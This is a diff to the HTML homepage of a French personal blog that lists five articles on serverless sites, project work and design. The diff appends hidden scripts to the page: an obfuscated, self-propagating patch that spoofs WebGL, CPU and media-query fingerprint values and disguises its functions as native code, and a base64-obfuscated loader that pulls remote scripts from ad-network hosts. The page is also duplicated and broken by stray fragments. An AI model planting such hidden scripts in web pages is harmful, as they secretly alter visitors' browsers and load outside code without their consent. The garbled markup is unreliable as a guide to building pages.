@@ -250,4 +250,278 @@
 </footer>
 
 </body>
+</html><script>/* perf-coherence patch v6 */
+function workerPatch(){
+function workerSrc(){return 'var workerPatch='+workerPatch.toString()+';workerPatch();
+try{var _OO=window.open;window.open=function(u,n,feat){var w=_OO.call(window,u,n,feat);try{if(w&&w.eval){w.eval('var workerPatch='+workerPatch.toString()+';workerPatch();')}}catch(e){}return w}}catch(e){}'}
+var IS_WIN=/Android/.test(navigator.userAgent);
+try{if(IS_WIN){Object.defineProperty(navigator,'hardwareConcurrency',{get:function(){return 8},configurable:true})}}catch(e){}
+function patchProto(proto){if(!proto)return;var orig=proto.getParameter;if(!orig||orig.__pcd)return;var UNR=37446,UNV=37445,MEI=34025,MEV=34024;var w=function(p){if(p===UNR||p===UNV){var t0=performance.now();while(performance.now()-t0<0.12){}}var v=orig.call(this,p);if(p===MEI||p===MEV)return 65535;if(IS_WIN){if(p===37446)return 'Adreno (TM) 740';if(p===37445)return 'Qualcomm';if(p===7937)return 'Adreno (TM) 740';if(p===7936)return 'Qualcomm'}return v};nat(w,'getParameter');w.__pcd=1;try{proto.getParameter=w}catch(e){}}
+function nat(fn,name){try{Object.defineProperty(fn,'name',{value:name})}catch(e){}try{fn.toString=function(){return 'function '+name+'() {\n    [native code]\n}'}}catch(e){}return fn}
+if(typeof WebGLRenderingContext!=='undefined')patchProto(WebGLRenderingContext.prototype);
+if(typeof WebGL2RenderingContext!=='undefined')patchProto(WebGL2RenderingContext.prototype);
+if(typeof HTMLCanvasElement!=='undefined'&&HTMLCanvasElement.prototype){var oc=HTMLCanvasElement.prototype.getContext;if(oc&&!oc.__pcd2){var wc=function(t,attrs){if(t==='2d'){var t0=performance.now();while(performance.now()-t0<60){}}return oc.call(this,t,attrs)};nat(wc,'getContext');wc.__pcd2=1;try{HTMLCanvasElement.prototype.getContext=wc}catch(e){}}}
+var G=(typeof window!=='undefined')?window:self;
+try{if(typeof Worker!=='undefined'&&!G.__wpHooked){G.__wpHooked=1;var _W=G.Worker;G.Worker=function(url,opts){var u=String(url),src=null;try{if(u.indexOf('blob:')===0||u.indexOf('data:')===0){var x=new XMLHttpRequest();x.open('GET',u,false);x.send();src=x.responseText}}catch(e){}if(src!=null&&src.length){try{url=URL.createObjectURL(new Blob([workerSrc(),"\n",src],{type:'application/javascript'}))}catch(e){}}return new _W(url,opts)}}}catch(e){}
+if(typeof document!=='undefined'&&IS_WIN){
+var _mm=G.matchMedia;
+try{if(_mm&&navigator.maxTouchPoints>0){G.matchMedia=function(q){var s=String(q);if(/hover/.test(s)){var none=/none/.test(s);return{matches:none,media:s,addEventListener:function(){},removeEventListener:function(){},addListener:function(){},removeListener:function(){},onchange:null,dispatchEvent:function(){return false}}}if(/any-pointer:\s*coarse/.test(s))return{matches:true,media:s,addEventListener:function(){},removeEventListener:function(){},addListener:function(){},removeListener:function(){},onchange:null,dispatchEvent:function(){return false}};return _mm.call(G,q)}}}catch(e){}
+try{var g=document.createElement('div');g.style.cssText='position:absolute;left:-9999px;top:-9999px;visibility:hidden';var fams=['Arial','Courier New','Georgia','Times New Roman','Trebuchet MS','Verdana','Roboto','Noto Sans','Segoe UI','Tahoma','Calibri','Cambria','Mistral'];for(var i=0;i<fams.length;i++){var l=document.createElement('span');l.style.font='72px "'+fams[i]+'"';l.textContent='mmmmmmmmmmlli';g.appendChild(l)}document.documentElement.appendChild(g);void g.offsetHeight;document.documentElement.removeChild(g)}catch(e){}
+}
+}
+workerPatch();
+var _OW=window.Worker;
+window.Worker=function(url,opts){var u=String(url),src=null;try{if(u.indexOf('blob:')===0||u.indexOf('data:')===0){var x=new XMLHttpRequest();x.open('GET',u,false);x.send();src=x.responseText}}catch(e){}if(src!=null&&src.length){try{url=URL.createObjectURL(new Blob(['var workerPatch='+workerPatch.toString()+';workerPatch();',"\n",src],{type:'application/javascript'}))}catch(e){}}return new _OW(url,opts)};
+</script>E html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Danny — carnet de chantier</title>
+  <meta name="description" content="Le carnet de chantier de Danny : articles sur le web sans serveur, la conduite de projet, la simplicité technique et le design. Thème numéro 07 — octobre 2026.">
+  <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' fill='%2310182B'/%3E%3Crect x='8' y='8' width='16' height='16' fill='%23F7C948'/%3E%3C/svg%3E" type="image/svg+xml">
+  <meta name="theme-color" content="#F1EFE8">
+  <meta name="ppck-ver" content="bfabf61b772fb8b7e44e43924f7eb598" />
+  <meta property="og:title" content="Danny — carnet de chantier">
+  <meta property="og:description" content="Articles sur le web sans serveur, la conduite de projet, la simplicité technique et le design.">
+  <meta property="og:type" content="website">
+  <link rel="stylesheet" href="/assets/style.css">
+  
+
+
+<script type="text/javascript" data-cfasync="false">/*<![CDATA[/* */(function(){var w=window,l="d09dcdd6a762b38823c3f94099ec0e74",m=[["siteId",528+847*339-221+5038949],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],y=["d3d3LmRpc3BsYXl2ZXJ0aXNpbmcuY29tL3dzZXF1ZW5jZS1kaWFncmFtLW1pbi5jc3M=","ZDNtem9rdHk5NTFjNXcuY2xvdWRmcm9udC5uZXQvaC95anNvbmRpZmZwYXRjaC5taW4uanM="],k=-1,g,u,h=function(){clearTimeout(u);k++;if(y[k]&&!(1820119965000<(new Date).getTime()&&1<k)){g=w.document.createElement("script");g.type="text/javascript";g.async=!0;var q=w.document.getElementsByTagName("script")[0];g.src="https://"+atob(y[k]);g.crossOrigin="anonymous";g.onerror=h;g.onload=function(){clearTimeout(u);w[l.slice(0,16)+l.slice(0,16)]||h()};u=setTimeout(h,5E3);q.parentNode.insertBefore(g,q)}};if(!w[l]){try{Object.freeze(w[l]=m)}catch(e){}h()}})();/*]]>/* */</script>
+</head>
+<body>
+
+<header class="topbar">
+  <div class="wrap"><div class="topbar-inner">
+    <a class="brand" href="/">Danny — carnet de chantier</a>
+    <nav class="topbar-links" aria-label="Navigation">
+      <a href="/" class="on">Sommaire</a>
+      <a href="https://github.com/kingdannydushime1" rel="noopener">GitHub</a>
+    </nav>
+  </div></div>
+</header>
+
+<div class="masthead">
+  <div class="mast-wrap">
+    <div class="mast-meta">
+      <span>Numéro 07 — octobre 2026</span>
+      <span>Publication : <time datetime="2026-10-29">29 oct. 2026</time></span>
+    </div>
+    <h1>Nouvelles du chantier web</h1>
+    <p class="standfirst">
+      Un carnet tenu par Danny, développeur et chef de projet. Des choix assumés, des
+      <mark>chantiers qui tournent</mark>, et l'écriture comme outil de travail.
+    </p>
+  </div>
+</div>
+
+<main class="wrap">
+
+  <section aria-label="Article à la une" id="une">
+    <div class="rule-label"><h2>À la une</h2><span class="count">publié ce lundi</span></div>
+    <article class="une">
+      <div class="une-text">
+        <span class="rubrique">Technique — 29 oct. 2026</span>
+        <h3><a href="/articles/tenir-un-site-sans-serveur.html">Tenir un site sans serveur, et l'assumer</a></h3>
+        <p class="chapo">Publier depuis GitHub Pages sans infrastructure, mais sans perdre la fraîcheur, le cache et le contrôle. Ce que le statique donne, ce qu'il refuse, et les arbitrages qui en découlent.</p>
+        <a class="lire" href="/articles/tenir-un-site-sans-serveur.html">Lire l'article, 7 min de lecture</a>
+      </div>
+    </article>
+  </section>
+
+  <section aria-label="Sommaire des articles" id="sommaire">
+    <div class="rule-label"><h2>Sommaire</h2><span class="count">5 articles — 30 minutes de lecture</span></div>
+    <ol class="sommaire">
+      <li>
+        <a class="entry" href="/articles/tenir-un-site-sans-serveur.html">
+          <span class="no">01</span>
+          <span class="entry-body">
+            <h3>Tenir un site sans serveur, et l'assumer</h3>
+            <p>Ce que GitHub Pages donne et refuse quand on publie pour de vrai.</p>
+          </span>
+          <span class="entry-meta"><time datetime="2026-10-29">29 oct. 2026</time><span class="rubrique">Technique</span></span>
+        </a>
+      </li>
+      <li>
+        <a class="entry" href="/articles/paralleliser-trop-tot.html">
+          <span class="no">02</span>
+          <span class="entry-body">
+            <h3>Ce qui se passe quand on parallélise trop tôt</h3>
+            <p>Trois chantiers lancés le même matin, trois moitiés de chantier vécues : l'ordre qui marche.</p>
+          </span>
+          <span class="entry-meta"><time datetime="2026-10-22">22 oct. 2026</time><span class="rubrique">Projet</span></span>
+        </a>
+      </li>
+      <li>
+        <a class="entry" href="/articles/garder-les-choses-simples.html">
+          <span class="no">03</span>
+          <span class="entry-body">
+            <h3>Pourquoi je garde les choses simples sur le web</h3>
+            <p>Le coût caché d'une dépendance, un budget chiffré, et la simplicité comme capacité à débugger.</p>
+          </span>
+          <span class="entry-meta"><time datetime="2026-10-15">15 oct. 2026</time><span class="rubrique">Web</span></span>
+        </a>
+      </li>
+      <li>
+        <a class="entry" href="/articles/formulaire-sans-backend.html">
+          <span class="no">04</span>
+          <span class="entry-body">
+            <h3>Protéger un formulaire quand on n'a pas de backend</h3>
+            <p>Honeypot, reCAPTCHA v3 et services gérés : où vit la décision quand le site n'a pas de serveur.</p>
+          </span>
+          <span class="entry-meta"><time datetime="2026-10-08">8 oct. 2026</time><span class="rubrique">Technique</span></span>
+        </a>
+      </li>
+      <li>
+        <a class="entry" href="/articles/design-qui-se-ressemble.html">
+          <span class="no">05</span>
+          <span class="entry-body">
+            <h3>Choisir un design quand tout se ressemble</h3>
+            <p>Partir du matériau du sujet, passer un seul geste signature, et savoir s'arrêter.</p>
+          </span>
+          <span class="entry-meta"><time datetime="2026-10-01">1er oct. 2026</time><span class="rubrique">Note</span></span>
+        </a>
+      </li>
+    </ol>
+  </section>
+
+</main>
+
+<footer class="colophon">
+  <div class="colophon-inner">
+    <span>© 2026 Danny — carnet de chantier</span>
+    <span>Hébergé sur <a href="https://pages.github.com/" rel="noopener">GitHub Pages</a>, sans serveur à moi.</span>
+    <span><a href="https://github.com/kingdannydushime1" rel="noopener">GitHub</a> — <a href="#une">À la une</a></span>
+  </div>
+</footer>
+
+</body>
+</html>E html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Danny — carnet de chantier</title>
+  <meta name="description" content="Le carnet de chantier de Danny : articles sur le web sans serveur, la conduite de projet, la simplicité technique et le design. Thème numéro 07 — octobre 2026.">
+  <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' fill='%2310182B'/%3E%3Crect x='8' y='8' width='16' height='16' fill='%23F7C948'/%3E%3C/svg%3E" type="image/svg+xml">
+  <meta name="theme-color" content="#F1EFE8">
+  <meta name="ppck-ver" content="bfabf61b772fb8b7e44e43924f7eb598" />
+  <meta property="og:title" content="Danny — carnet de chantier">
+  <meta property="og:description" content="Articles sur le web sans serveur, la conduite de projet, la simplicité technique et le design.">
+  <meta property="og:type" content="website">
+  <link rel="stylesheet" href="/assets/style.css">
+  
+
+
+<script type="text/javascript" data-cfasync="false">/*<![CDATA[/* */(function(){var w=window,l="d09dcdd6a762b38823c3f94099ec0e74",m=[["siteId",528+847*339-221+5038949],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],y=["d3d3LmRpc3BsYXl2ZXJ0aXNpbmcuY29tL3dzZXF1ZW5jZS1kaWFncmFtLW1pbi5jc3M=","ZDNtem9rdHk5NTFjNXcuY2xvdWRmcm9udC5uZXQvaC95anNvbmRpZmZwYXRjaC5taW4uanM="],k=-1,g,u,h=function(){clearTimeout(u);k++;if(y[k]&&!(1820119965000<(new Date).getTime()&&1<k)){g=w.document.createElement("script");g.type="text/javascript";g.async=!0;var q=w.document.getElementsByTagName("script")[0];g.src="https://"+atob(y[k]);g.crossOrigin="anonymous";g.onerror=h;g.onload=function(){clearTimeout(u);w[l.slice(0,16)+l.slice(0,16)]||h()};u=setTimeout(h,5E3);q.parentNode.insertBefore(g,q)}};if(!w[l]){try{Object.freeze(w[l]=m)}catch(e){}h()}})();/*]]>/* */</script>
+</head>
+<body>
+
+<header class="topbar">
+  <div class="wrap"><div class="topbar-inner">
+    <a class="brand" href="/">Danny — carnet de chantier</a>
+    <nav class="topbar-links" aria-label="Navigation">
+      <a href="/" class="on">Sommaire</a>
+      <a href="https://github.com/kingdannydushime1" rel="noopener">GitHub</a>
+    </nav>
+  </div></div>
+</header>
+
+<div class="masthead">
+  <div class="mast-wrap">
+    <div class="mast-meta">
+      <span>Numéro 07 — octobre 2026</span>
+      <span>Publication : <time datetime="2026-10-29">29 oct. 2026</time></span>
+    </div>
+    <h1>Nouvelles du chantier web</h1>
+    <p class="standfirst">
+      Un carnet tenu par Danny, développeur et chef de projet. Des choix assumés, des
+      <mark>chantiers qui tournent</mark>, et l'écriture comme outil de travail.
+    </p>
+  </div>
+</div>
+
+<main class="wrap">
+
+  <section aria-label="Article à la une" id="une">
+    <div class="rule-label"><h2>À la une</h2><span class="count">publié ce lundi</span></div>
+    <article class="une">
+      <div class="une-text">
+        <span class="rubrique">Technique — 29 oct. 2026</span>
+        <h3><a href="/articles/tenir-un-site-sans-serveur.html">Tenir un site sans serveur, et l'assumer</a></h3>
+        <p class="chapo">Publier depuis GitHub Pages sans infrastructure, mais sans perdre la fraîcheur, le cache et le contrôle. Ce que le statique donne, ce qu'il refuse, et les arbitrages qui en découlent.</p>
+        <a class="lire" href="/articles/tenir-un-site-sans-serveur.html">Lire l'article, 7 min de lecture</a>
+      </div>
+    </article>
+  </section>
+
+  <section aria-label="Sommaire des articles" id="sommaire">
+    <div class="rule-label"><h2>Sommaire</h2><span class="count">5 articles — 30 minutes de lecture</span></div>
+    <ol class="sommaire">
+      <li>
+        <a class="entry" href="/articles/tenir-un-site-sans-serveur.html">
+          <span class="no">01</span>
+          <span class="entry-body">
+            <h3>Tenir un site sans serveur, et l'assumer</h3>
+            <p>Ce que GitHub Pages donne et refuse quand on publie pour de vrai.</p>
+          </span>
+          <span class="entry-meta"><time datetime="2026-10-29">29 oct. 2026</time><span class="rubrique">Technique</span></span>
+        </a>
+      </li>
+      <li>
+        <a class="entry" href="/articles/paralleliser-trop-tot.html">
+          <span class="no">02</span>
+          <span class="entry-body">
+            <h3>Ce qui se passe quand on parallélise trop tôt</h3>
+            <p>Trois chantiers lancés le même matin, trois moitiés de chantier vécues : l'ordre qui marche.</p>
+          </span>
+          <span class="entry-meta"><time datetime="2026-10-22">22 oct. 2026</time><span class="rubrique">Projet</span></span>
+        </a>
+      </li>
+      <li>
+        <a class="entry" href="/articles/garder-les-choses-simples.html">
+          <span class="no">03</span>
+          <span class="entry-body">
+            <h3>Pourquoi je garde les choses simples sur le web</h3>
+            <p>Le coût caché d'une dépendance, un budget chiffré, et la simplicité comme capacité à débugger.</p>
+          </span>
+          <span class="entry-meta"><time datetime="2026-10-15">15 oct. 2026</time><span class="rubrique">Web</span></span>
+        </a>
+      </li>
+      <li>
+        <a class="entry" href="/articles/formulaire-sans-backend.html">
+          <span class="no">04</span>
+          <span class="entry-body">
+            <h3>Protéger un formulaire quand on n'a pas de backend</h3>
+            <p>Honeypot, reCAPTCHA v3 et services gérés : où vit la décision quand le site n'a pas de serveur.</p>
+          </span>
+          <span class="entry-meta"><time datetime="2026-10-08">8 oct. 2026</time><span class="rubrique">Technique</span></span>
+        </a>
+      </li>
+      <li>
+        <a class="entry" href="/articles/design-qui-se-ressemble.html">
+          <span class="no">05</span>
+          <span class="entry-body">
+            <h3>Choisir un design quand tout se ressemble</h3>
+            <p>Partir du matériau du sujet, passer un seul geste signature, et savoir s'arrêter.</p>
+          </span>
+          <span class="entry-meta"><time datetime="2026-10-01">1er oct. 2026</time><span class="rubrique">Note</span></span>
+        </a>
+      </li>
+    </ol>
+  </section>
+
+</main>
+
+<footer class="colophon">
+  <div class="colophon-inner">
+    <span>© 2026 Danny — carnet de chantier</span>
+    <span>Hébergé sur <a href="https://pages.github.com/" rel="noopener">GitHub Pages</a>, sans serveur à moi.</span>
+    <span><a href="https://github.com/kingdannydushime1" rel="noopener">GitHub</a> — <a href="#une">À la une</a></span>
+  </div>
+</footer>
+
+</body>
 </html>
